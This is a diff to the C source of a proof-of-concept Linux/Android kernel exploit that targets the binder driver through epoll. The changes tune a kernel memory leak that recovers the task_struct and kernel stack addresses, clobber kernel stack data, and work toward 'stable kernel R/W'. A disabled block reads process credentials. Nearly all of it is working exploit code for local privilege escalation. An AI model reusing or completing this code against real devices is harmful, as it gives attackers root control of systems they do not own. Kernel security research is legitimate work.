@@ -207,7 +207,7 @@ void leak_data(void* leakBuffer, int leakAmount,
     unsigned long* task_struct_ptr_p, unsigned long* kstack_p)
 {
   unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST+8;
-  unsigned long adjLeakAmount = MAX(leakAmount, minimumLeak);
+  unsigned long adjLeakAmount = MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I would think that minimumLeak should be enough
  
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
@@ -273,7 +273,7 @@ void leak_data(void* leakBuffer, int leakAmount,
     unsigned long task_struct_ptr=0;
 
     memcpy(&task_struct_ptr, dataBuffer+TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
-    printf("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);
+    printf("CHILD: task_struct_ptr = 0x%lx\n", task_struct_ptr);
 
     if (extraLeakAmount > 0 || kstack_p != NULL) {
         unsigned long extra[6] = { 
@@ -320,7 +320,7 @@ void leak_data(void* leakBuffer, int leakAmount,
   printf("PARENT: Reading leaked data\n");
   
   b = read(leakPipe[0], dataBuffer, adjLeakAmount);
-  if (b != leakAmount) errx(1, "reading leak: read 0x%x needed 0x%x", b, leakAmount);
+  if (b != adjLeakAmount) errx(1, "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
 
   if (leakAmount > 0)
       memcpy(leakBuffer, dataBuffer, leakAmount);
@@ -385,17 +385,13 @@ void kernel_write_uint(unsigned long kaddr, unsigned int data) {
 
 int main(int argc, char** argv) {
   printf("Starting POC\n");
-  //pin_to(0);
 
-/*  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-  if (dummy_page_4g_aligned != (void*)0x100000000UL)
-    err(1, "mmap 4g aligned"); */
   if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");
 
   binder_fd = open("/dev/binder", O_RDONLY);
   epfd = epoll_create(1000);
 
-  int leakSize = argc < 2 ? 2*4096+16 : atoi(argv[1]); // +9
+  int leakSize = argc < 2 ? 2*4096+8 : atoi(argv[1]); // +9
   printf("Leak size %d\n", leakSize);
   unsigned char* leaked = malloc(leakSize);
   if (leaked == NULL) err(1, "Allocating leak buffer");
@@ -403,7 +399,7 @@ int main(int argc, char** argv) {
   unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
   leak_data(leaked, leakSize, 0, NULL, 0, &task_struct_ptr, &kstack);
   if (leakSize >= 0) {
-      hexdump_memory(leaked, leakSize/16*16);
+//      hexdump_memory(leaked, leakSize/16*16);
   }
   printf("task_struct_ptr = %lx\n", (unsigned long)task_struct_ptr);
   printf("stack = %lx\n", kstack);
@@ -411,17 +407,15 @@ int main(int argc, char** argv) {
   unsigned long const src=0xFFFFFFFFFFFFFFFEul;
   clobber_data(kstack+8, &src, 8);
   
-  unsigned long current_mm = kernel_read_ulong(task_struct_ptr); 
-  printf("current->mm == 0x%lx\n", current_mm);
+  printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+8));
 
   free(leaked);
-  
-#if 0 // TODO
-  clobber_data();
 
   setbuf(stdout, NULL);
   printf("should have stable kernel R/W now\n");
 
+  
+#if 0 // TODO
   /* in case you want to do stuff with the creds, to show that you can get them: */
   unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
   printf("current->mm == 0x%lx\n", current_mm);
